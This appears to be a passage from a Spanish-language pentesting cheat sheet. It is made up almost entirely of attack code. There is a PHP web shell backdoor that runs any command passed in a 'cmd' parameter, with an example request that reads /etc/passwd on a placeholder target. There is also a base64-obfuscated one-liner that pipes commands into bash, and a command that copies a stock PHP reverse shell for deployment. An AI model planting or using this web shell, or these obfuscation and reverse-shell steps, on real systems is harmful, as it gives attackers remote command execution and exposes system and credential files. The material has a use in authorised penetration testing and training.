```php
<?php

if(isset($_REQUEST['cmd'])){
        echo "<pre>";
        $cmd = ($_REQUEST['cmd']);
        system($cmd);
        echo "</pre>";
        die;
}

?>

Usage: http://target.com/simple-backdoor.php?cmd=cat+/etc/passwd
```

##### Ofuscación

```bash
echo+echo+'whoami'+|+base64+|+base64+-d+|+bash+|+bash
```

##### RevShells

```bash
cat /usr/share/webshells/php/php-reverse-shel.php > my_shell
```
